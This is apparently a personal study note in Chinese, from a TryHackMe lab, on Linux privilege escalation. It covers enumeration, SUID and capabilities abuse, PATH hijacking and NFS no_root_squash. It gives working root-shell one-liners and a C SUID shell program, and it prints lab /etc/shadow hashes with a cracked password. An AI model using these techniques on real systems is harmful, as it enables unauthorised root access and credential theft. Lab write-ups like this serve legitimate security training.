---
{"dg-publish":true,"title":"linux提权","dg-path":"THM/linux提权.md","permalink":"/THM/linux提权/","dgPassFrontmatter":true}
---

# 枚举

枚举是您访问任何系统后必须采取的第一步。您可能已经通过利用导致根级别访问的严重漏洞来访问系统，或者只是找到了使用低特权帐户发送命令的方法。与 CTF 机器不同，渗透测试活动不会在您获得特定系统或用户权限级别的访问权限后结束。正如您将看到的，枚举在攻击后阶段与攻击前一样重要。

## hostname

```shell
hostname
```

`hostname`命令将返回目标计算机的主机名。尽管该值可以很容易地更改或具有相对无意义的字符串（例如 Ubuntu-3487340239），但在某些情况下，它可以提供有关目标系统在企业网络中的角色的信息

## uname -a

```shell
uname -a
```
将打印系统信息，为我们提供有关系统使用的内核的更多详细信息。这在搜索任何可能导致权限升级的潜在内核漏洞时非常有用。


## /proc/version
proc 文件系统 (procfs) 提供有关目标系统进程的信息。您会在许多不同的Linux版本中找到 proc，这使其成为您的工具库中必不可少的工具。
查看`/proc/version` 可能会为您提供有关内核版本的信息以及其他数据，例如是否安装了编译器（例如 GCC）。

## /etc/issue
可以通过查看`/etc/issue`文件来识别系统。该文件通常包含一些有关操作系统的信息，但可以轻松自定义或更改。在这个主题上，任何包含系统信息的文件都可以定制或更改。为了更清楚地了解系统，最好查看所有这些内容。



## ps
`ps`命令是查看Linux系统上正在运行的进程的有效方法。
在终端上输入`ps`将显示**当前 shell** 的进程。

其他选项：
+ `ps -a`查看所有正在运行的进程
+ `ps axjf`查看进程树
+ `ps aux` `aux`选项将显示所有用户的进程 (a)、显示启动进程的用户 (u) 以及显示未连接到终端的进程 (x)。查看ps aux命令的输出，我们可以更好地了解系统和潜在的漏洞。

## env

`env`命令将显示环境变量。
PATH 变量可能具有编译器或脚本语言（例如Python），可用于在目标系统上运行代码或用于权限升级。

## sudo -l

目标系统可以配置为允许用户以 root 权限运行某些（或全部）命令。 `sudo -l`命令可用于列出用户可以使用`sudo`运行的所有命令

## Id

`id`命令将提供用户权限级别和组成员身份的总体概述。
值得记住的是， `id`命令也可用于获取另一个用户的相同信息

## /etc/passwd
读取`/etc/passwd`文件是发现系统上用户的简单方法。

虽然输出可能很长并且有点令人生畏，但它可以轻松地被剪切并转换为用于暴力攻击的有用列表。

请记住，这将返回所有用户，其中一些是不是很有用的系统或服务用户。另一种方法可能是 grep 查找“home”，因为真正的用户很可能将其文件夹放在“home”目录下。

## history
使用`history`命令查看早期命令可以让我们了解目标系统，并且（尽管很少）存储了密码或用户名等信息。

## ifconfig

目标系统可能是另一个网络的枢纽点。 `ifconfig`命令将为我们提供有关系统网络接口的信息。下面的示例显示目标系统具有三个接口（eth0、tun0 和 tun1）。我们的攻击机器可以到达 eth0 接口，但无法直接访问其他两个网络。

可以使用`ip route`命令查看存在哪些网络路由来确认这一点。


## netstat

## find
以下是“查找”命令的一些有用示例。

- `find . -name flag1.txt`: 在当前目录中查找名为 "flag1.txt" 的文件
- `find /home -name flag1.txt`: 在 `/home` 目录中查找名为 "flag1.txt" 的文件
- `find / -type d -name config`: 在根目录 `/` 下查找名为 "config" 的目录
- `find / -type f -perm 0777`: 查找具有 777 权限（所有用户均可读、写、执行）的文件
- `find / -perm a=x`: 查找可执行文件
- `find /home -user frank`: 在 `/home` 目录下查找属于用户 "frank" 的所有文件
- `find / -mtime 10`: 查找过去 10 天内修改过的文件
- `find / -atime 10`: 查找过去 10 天内访问过的文件
- `find / -cmin -60`: 查找在过去一小时（60 分钟）内更改过的文件
- `find / -amin -60`: 查找在过去一小时（60 分钟）内访问过的文件
- `find / -size 50M`: 查找大小为 50 MB 的文件
值得注意的是，“find”命令往往会产生错误，有时会导致输出难以阅读。这就是为什么明智的做法是使用“find”命令和“-type f 2>/dev/null”将错误重定向到“/dev/null”并获得更清晰的输出



+ `find / -writable -type d 2>/dev/null` ：查找全局可写文件夹
+ `find / -perm -222 -type d 2>/dev/null` ：查找全局可写文件夹
+ `find / -perm -o w -type d 2>/dev/null` ：查找全局可写文件夹
+ `find / -perm -o x -type d 2>/dev/null` ：查找全局可执行文件夹


查找开发工具和支持的语言：
+ `find / -name perl*`
+ `find / -name python*`
- `find / -name gcc*`

查找特定文件权限：
+ `find / -perm -u=s -type f 2>/dev/null` ：查找带有SUID位的文件，它允许我们以比当前用户更高的权限级别运行该文件。


# 自动化枚举工具


+ [LinPeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
+ [LinEnum](https://github.com/rebootuser/LinEnum)
+ [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
+ [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+ [Linux Priv Checker](https://github.com/linted/linuxprivchecker)




# sudo

任何用户都可以使用`sudo -l`命令检查其与 root 权限相关的当前情况。

[https://gtfobins.github.io/](https://gtfobins.github.io/)
是一个有价值的资源，它提供了有关如何使用您可能拥有 sudo 权限的任何程序的信息。



# SUID

```shell
find / -type f -perm -04000 -ls 2>/dev/null
```
将列出设置了 SUID 或 SGID 位的文件。

简单实例：
现在靶场的base64具有SUID位

```
LFILE=file_to_read
./base64 "$LFILE" | base64 --decode
```
由于没法直接获得root权限的shell，但是我们有读文件的权限
所以我们可以尝试破解密码

利用base将文件`etc/passwd`和`etc/shadow`文件下载到本地

由于我们想要破解`user2`的密码，所以我们将其内容单独保存到两个文件中
user2_pa.txt：
```txt
user2:x:1002:1002::/home/user2:/bin/sh
```

user2_sh.txt:
```txt
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
```

然后我们使用unshadow工具将其改成john可以破解的格式
![Pasted image 20240920200301.png](/img/user/picture/Pasted%20image%2020240920200301.png)

然后我们使用john破解密码：
![Pasted image 20240920200359.png](/img/user/picture/Pasted%20image%2020240920200359.png)
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt user2.txt
```
得到密码：
```
Password1
```


# capabilities（能力）

Linux capabilities（能力）是 Linux 内核提供的一种机制，用于将超级用户（root）权限细化为更小的权限集，从而实现更细粒度的权限控制。传统上，root 用户具有系统中的所有权限，而普通用户没有。然而，在某些场景下，某些程序只需要执行一部分特定的高权限操作，比如打开网络端口或管理系统资源，不需要完整的 root 权限。Linux capabilities 就是为了解决这种需求而提出的。

通过将 root 权限分解为多个离散的 "capabilities"，系统可以赋予非 root 程序特定的能力，而无需授予它们所有的 root 权限。

### Capabilities 的结构
每个文件或进程可以拥有一组 capabilities。每种 capability 代表系统权限的一个特定子集，例如管理文件系统、使用网络套接字、调整进程优先级等。通过 capabilities，可以在保证系统安全的前提下，为某些程序赋予其执行特定任务所需的最小权限。

### 常见的 capabilities 列表
以下是一些常见的 Linux capabilities 以及它们的作用：

1. **CAP_CHOWN**：允许修改文件的所有权。
2. **CAP_DAC_OVERRIDE**：允许绕过文件读取、写入和执行权限检查（绕过 `DAC`，即 Discretionary Access Control，用户自行控制的访问控制）。
3. **CAP_FOWNER**：允许绕过某些文件所有权检查。
4. **CAP_KILL**：允许向任何进程发送信号，即使该进程属于另一个用户。
5. **CAP_NET_ADMIN**：允许管理网络接口、路由表、网络防火墙等网络设置。
6. **CAP_NET_BIND_SERVICE**：允许绑定到低于 1024 的特权端口（如 HTTP 使用的 80 端口）。
7. **CAP_NET_RAW**：允许使用原始套接字（Raw Sockets），例如 `ping` 命令使用的权限。
8. **CAP_SYS_BOOT**：允许执行重启操作（如 `reboot` 命令）。
9. **CAP_SYS_ADMIN**：允许执行多种系统管理操作（这个是非常强大的能力，类似 root 权限，应用广泛，尽量避免赋予）。
10. **CAP_SYS_TIME**：允许修改系统时间。

### 文件的 capabilities
文件 capabilities 是通过 `setcap` 命令直接赋予某个可执行文件某些特定权限，意味着该文件可以在非 root 用户的权限下运行时获得额外的权限。与 `setuid`（设置用户ID）不同，capabilities 的引入是为了更安全地限制权限。

#### 文件 capabilities 的组成部分
文件 capabilities 通常由三个部分组成：

1. **Effective (e)**：如果设置了这个标志，表示该 capability 会在程序运行时生效。
2. **Permitted (p)**：这个标志表示程序可以使用该 capability。
3. **Inheritable (i)**：继承标志，表示在子进程中是否保留该 capability。

文件 capabilities 的格式为 `capability+ep`，例如：

```
/usr/bin/ping = cap_net_raw+ep
```
这表示 `ping` 文件拥有 `cap_net_raw` 能力，并且是 effective 和 permitted 的。

### 查看和管理文件的 capabilities

1. **查看文件 capabilities**
   使用 `getcap` 可以查看文件的 capabilities：
   ```bash
   getcap /usr/bin/ping
   ```
   输出示例：
   ```
   /usr/bin/ping = cap_net_raw+ep
   ```

2. **设置文件 capabilities**
   使用 `setcap` 可以设置文件的 capabilities。例如，给程序赋予允许使用原始网络套接字的权限：
   ```bash
   sudo setcap cap_net_raw+ep /usr/bin/ping
   ```
   这会将 `cap_net_raw` 能力添加到 `ping` 程序中。

3. **移除文件 capabilities**
   使用 `setcap -r` 可以移除文件的所有 capabilities：
   ```bash
   sudo setcap -r /usr/bin/ping
   ```

### Capabilities 的使用场景
Capabilities 的引入使得 Linux 系统更灵活，并且在一定程度上提升了安全性。常见的使用场景包括：

1. **网络服务**：某些网络服务需要绑定低号端口（如 80 或 443），但并不需要完全的 root 权限，这时可以通过 `CAP_NET_BIND_SERVICE` 来允许非 root 用户绑定这些端口。
   
2. **网络工具**：如 `ping` 工具需要原始套接字权限来发送 ICMP 数据包，但不需要 root 权限，可以通过 `CAP_NET_RAW` 赋予权限。

3. **特定的系统任务**：某些任务如时间设置、文件所有权修改等，通常需要 root 权限，但通过细粒度的 capabilities，可以只赋予相关的权限，降低权限提升带来的风险。

### Capabilities 的安全优势
传统上，使用 `setuid` 标志可以让普通用户临时提升为 root 来执行某些操作。然而，`setuid` 存在潜在的安全隐患，特别是当程序出现漏洞时，攻击者可以通过漏洞获得 root 权限。

相比之下，Linux capabilities 允许程序只获得所需的最小权限，而不是所有 root 权限。例如，通过给 `ping` 程序赋予 `CAP_NET_RAW`，程序可以执行 ICMP ping 操作，但不能访问其他系统资源。这样可以减小权限提升攻击的影响范围。

### 总结
- Linux capabilities 是一种将 root 权限细分为多个独立能力的机制，可以更安全、灵活地管理权限。
- 使用 `getcap` 查看文件的能力，`setcap` 管理文件的能力。
- Capabilities 提供了一种替代 `setuid` 的机制，使得程序只拥有执行所需的最小权限，从而提升系统的安全性。

通过合理使用 Linux capabilities，可以显著增强系统的安全性，同时满足特定应用的权限需求。



## 能力利用


首先查看启用的Capabilities
```shell
getcap -r / 2>/dev/null
```

![Pasted image 20240921113554.png](/img/user/picture/Pasted%20image%2020240921113554.png)

[GTFObins ](https://gtfobins.github.io/) 有一个很好的二进制文件列表，如果我们发现任何设置的功能，可以利用这些二进制文件进行权限升级

我们注意到 vim 可以与以下命令和负载一起使用：
```shell
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
注意py的版本
这将启动一个 root shell

# Cron jobs


Cron 作业用于在特定时间运行脚本或二进制文件。默认情况下，它们以其所有者的权限运行，而不是以当前用户的权限运行。虽然正确配置的 cron 作业本身并不容易受到攻击，但它们在某些情况下可以提供权限升级向量。

这个想法很简单；如果有一个以 root 权限运行的计划任务，并且我们可以更改将运行的脚本，那么我们的脚本将以 root 权限运行。

Cron 作业配置存储为 crontab（cron 表），以查看任务下次运行的时间和日期。

系统上的每个用户都有自己的 crontab 文件，并且无论是否登录都可以运行特定任务。正如您所期望的，我们的目标是找到由 root 设置的 cron 作业并让它运行我们的脚本（最好是 shell）。

任何用户都可以读取`/etc/crontab`下保存系统范围 cron 作业的文件




# PATH

Linux 中的 PATH 是一个环境变量，它告诉操作系统在哪里搜索可执行文件。
**对于任何未内置到 shell 中或未使用绝对路径定义的命令，Linux 将开始在 PATH 下定义的文件夹中搜索。**

查看环境变量：
```shell
echo $PATH
```

![Pasted image 20240921160513.png](/img/user/picture/Pasted%20image%2020240921160513.png)
好像没有办法只依靠PATH来获取到root权限，还是需要利用其他的一些错误配置

比如下面的靶场有一个二进制可执行文件的所有者是root，而且被设置了SUID位，这个可执行文件的功能是以root权限去执行一个`thm`文件
由于在代码中没有使用绝对路径，所以我们就可以改变环境变量PATH去执行我们的恶意脚本


**THM靶场练习：**
如果我没有理解错的话，应该是有两类思路，一类是查找有写入权限的文件夹，看这里面有没有PATH环境变量里面的路径，然后我们把恶意脚本放进这里就行
首先查找有写入权限的文件夹：
```shell
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

还有一个思路就是我们在一个有写入权限的路径下放入我们的恶意脚本，之后我们把这个路径去添加进PATH就可以
比如把`/tmp` 添加进PATH
```shell
export PATH=/tmp:$PATH
```

首先我们先查看一下有没有设置了SUID位的文件
```shell
find / -type f -perm -04000 -ls 2>/dev/null
```
发现了一个test文件：
![Pasted image 20240921163609.png](/img/user/picture/Pasted%20image%2020240921163609.png)
可以知道他是去运行一个thm文件

我们在`/tmp`文件夹下创建thm文件
![Pasted image 20240921163832.png](/img/user/picture/Pasted%20image%2020240921163832.png)

之后运行一下test
(有一个小插曲，就是bash路径错了，之后改一下就可以了)
![Pasted image 20240921164105.png](/img/user/picture/Pasted%20image%2020240921164105.png)

拿到root






# NFS

NFS（网络文件共享）配置保存在 /etc/exports 文件中。该文件是在 NFS 服务器安装期间创建的，通常可供用户读取。

示例：
![Pasted image 20240921195512.png](/img/user/picture/Pasted%20image%2020240921195512.png)
此权限升级向量的关键元素是您在上面看到的“no_root_squash”选项。默认情况下，NFS 会将 root 用户更改为 nfsnobody，并禁止以 root 权限操作任何文件。如果可写共享上存在“no_root_squash”选项，**我们可以创建一个设置了 SUID 位的可执行文件并在目标系统上运行它。**

这种漏洞的思路是在本机上有root的SUID可执行恶意文件上传到对方的共享文件夹中，这样用低权限的用户运行恶意文件就可以获得到root权限


**靶场练习：**

首先查看一下`/etc/exports `文件
![Pasted image 20240921200110.png](/img/user/picture/Pasted%20image%2020240921200110.png)

注意到有三个共享文件夹，我们使用第二个`/tmp`


之后我们将其挂在到本地来
![Pasted image 20240921201110.png](/img/user/picture/Pasted%20image%2020240921201110.png)
```shell
mount -o rw 10.10.205.131:/tmp /root/tmp
```

编写恶意文件，注意权限为root
![Pasted image 20240921201501.png](/img/user/picture/Pasted%20image%2020240921201501.png)
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

**注意：**
这里在运行的时候出现一个问题
![Pasted image 20240921202011.png](/img/user/picture/Pasted%20image%2020240921202011.png)
一个动态链接库没有找到，应该是两个机器环境版本不一致导致的，所以可以在编译时选择静态编译，加上`-static`选项

拿到root
![Pasted image 20240921202135.png](/img/user/picture/Pasted%20image%2020240921202135.png)





# 最终挑战



先尝试用自动化枚举工具测试一下

有用信息
环境变量：
![Pasted image 20240921213430.png](/img/user/picture/Pasted%20image%2020240921213430.png)
```
/home/leonard/scripts:/usr/sue/bin:/usr/lib64/qt-3.3/bin:/home/leonard/perl5/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/opt/puppetlabs/bin:/home/leonard/.local/bin:/home/leonard/bin
```


`sudo -l`为空


SUID有base64，尝试读取一下密码文件

passwd：
```txt
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
colord:x:998:995:User for colord:/var/lib/colord:/sbin/nologin
unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin
libstoragemgmt:x:996:993:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
saslauth:x:995:76:Saslauthd user:/run/saslauthd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
gluster:x:994:992:GlusterFS daemons:/run/gluster:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
setroubleshoot:x:993:990::/var/lib/setroubleshoot:/sbin/nologin
rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
radvd:x:75:75:radvd user:/:/sbin/nologin
chrony:x:992:987::/var/lib/chrony:/sbin/nologin
saned:x:991:986:SANE scanner daemon user:/usr/share/sane:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
qemu:x:107:107:qemu user:/:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
sssd:x:990:984:User for sssd:/:/sbin/nologin
usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
geoclue:x:989:983:User for geoclue:/var/lib/geoclue:/sbin/nologin
gdm:x:42:42::/var/lib/gdm:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin
pcp:x:987:981:Performance Co-Pilot:/var/lib/pcp:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
oprofile:x:16:16:Special user account to be used by OProfile:/var/lib/oprofile:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
missy:x:1001:1001::/home/missy:/bin/bash
```


shadow:
```txt
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
pegasus:!!:18785::::::
systemd-network:!!:18785::::::
dbus:!!:18785::::::
polkitd:!!:18785::::::
colord:!!:18785::::::
unbound:!!:18785::::::
libstoragemgmt:!!:18785::::::
saslauth:!!:18785::::::
rpc:!!:18785:0:99999:7:::
gluster:!!:18785::::::
abrt:!!:18785::::::
postfix:!!:18785::::::
setroubleshoot:!!:18785::::::
rtkit:!!:18785::::::
pulse:!!:18785::::::
radvd:!!:18785::::::
chrony:!!:18785::::::
saned:!!:18785::::::
apache:!!:18785::::::
qemu:!!:18785::::::
ntp:!!:18785::::::
tss:!!:18785::::::
sssd:!!:18785::::::
usbmuxd:!!:18785::::::
geoclue:!!:18785::::::
gdm:!!:18785::::::
rpcuser:!!:18785::::::
nfsnobody:!!:18785::::::
gnome-initial-setup:!!:18785::::::
pcp:!!:18785::::::
sshd:!!:18785::::::
avahi:!!:18785::::::
oprofile:!!:18785::::::
tcpdump:!!:18785::::::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
mailnull:!!:18785::::::
smmsp:!!:18785::::::
nscd:!!:18785::::::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```

root的密码好像并不好破解。。。。
还是得尝试一下其他用户
![Pasted image 20240921222237.png](/img/user/picture/Pasted%20image%2020240921222237.png)

得到用户密码：
```txt
Password1        (missy)
```


我们查看一下他的`sudo -l`
![Pasted image 20240921222829.png](/img/user/picture/Pasted%20image%2020240921222829.png)

可以发现有find的sudo权限
![Pasted image 20240921222911.png](/img/user/picture/Pasted%20image%2020240921222911.png)
```shell

sudo find . -exec /bin/sh \; -quit

```

得到rootshell
![Pasted image 20240921222940.png](/img/user/picture/Pasted%20image%2020240921222940.png)

顺便贴一下找flag的指令：
```shell
find / -name flag2.txt 2>/dev/null
```


![Pasted image 20240921223043.png](/img/user/picture/Pasted%20image%2020240921223043.png)